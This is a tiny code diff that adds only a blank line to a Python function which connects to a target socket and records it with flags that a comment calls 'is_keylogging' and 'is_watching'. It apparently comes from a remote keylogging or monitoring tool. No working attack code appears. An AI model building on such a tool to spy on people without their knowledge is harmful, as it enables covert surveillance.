@@ -152,6 +152,7 @@ def initial_connect_to_client(sockets_list: list, connected_clients: dict,
         # Add the new client socket to the connected_clients dictionary (Key/Value pair) -> (is_keylogging, is_watching)
         connected_clients[target_socket] = (dest_ip, dest_port, False, False)
         sockets_list.append(target_socket)
+
         return target_socket
 
     except Exception as e:
